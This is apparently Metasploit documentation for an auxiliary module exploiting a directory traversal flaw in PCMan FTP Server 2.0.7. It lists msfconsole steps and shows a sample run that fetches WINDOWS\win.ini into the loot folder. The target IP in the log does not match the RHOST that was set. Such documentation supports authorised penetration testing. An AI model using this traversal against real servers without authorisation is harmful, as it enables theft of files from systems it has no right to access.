## Vulnerable Application

This module exploits a directory traversal vulnerability found in PCMan FTP Server 2.0.7. This vulnerability allows an attacker to download arbitrary files from the server by crafting a RETR command that includes file system traversal strings such as '..//'

Linked to software download [Exploit-DB](https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z)

## Verification Steps

  1. Start msfconsole
  2. Do: `use modules/auxiliary/scanner/ftp/pcman_ftp_traversal`
  3. Do: `show options`
      ...show and set options...
  4. Do: `run`

## Scenarios

A run on Windows 7 (x64) and PCMan FTP Server 2.0.7.

  ```
  msf > use modules/auxiliary/scanner/ftp/pcman_ftp_traversal
  msf auxiliary(scanner/ftp/pcman_ftp_traversal) > show options
  msf auxiliary(scanner/ftp/pcman_ftp_traversal) > set RHOST 1.1.1.1
    rhost => 1.1.1.1
  msf auxiliary(scanner/ftp/pcman_ftp_traversal) > set PATH WINDOWS\\win.ini
    PATH => WINDOWS\win.ini
  msf auxiliary(scanner/ftp/pcman_ftp_traversal) > run    
    [+] 192.168.2.252:21      - Stored WINDOWS\win.ini to /root/.msf4/loot/20191120201523_default_1.1.1.1_pcman.ftp.data_069450.ini
    [*] 192.168.2.252:21      - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
  ```
